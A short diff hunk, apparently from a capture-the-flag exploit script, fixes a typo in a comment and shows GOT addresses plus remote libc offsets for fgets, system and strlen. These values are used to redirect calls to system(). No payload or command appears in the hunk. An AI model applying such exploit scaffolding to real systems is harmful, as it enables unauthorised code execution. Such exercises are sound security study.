@@ -19,7 +19,7 @@ STRLEN_GOT    = 0x601210
 EXIT_GOT      = 0x601258
 FGETS_GOT     = 0x601230
 # be aware that every system with different libc.so.6 has different offset
-# the remote part is by readelfing the lib.so.6 on server with the similiar path
+# the remote part is by readelfing the libc.so.6 on server with the similiar path
 REMOTE_FGETS_OFFSET  = 0x69df0 # remote
 REMOTE_SYSTEM_OFFSET = 0x41490 # remote
 REMOTE_STRLEN_OFFSET = 0x81c10 # remote
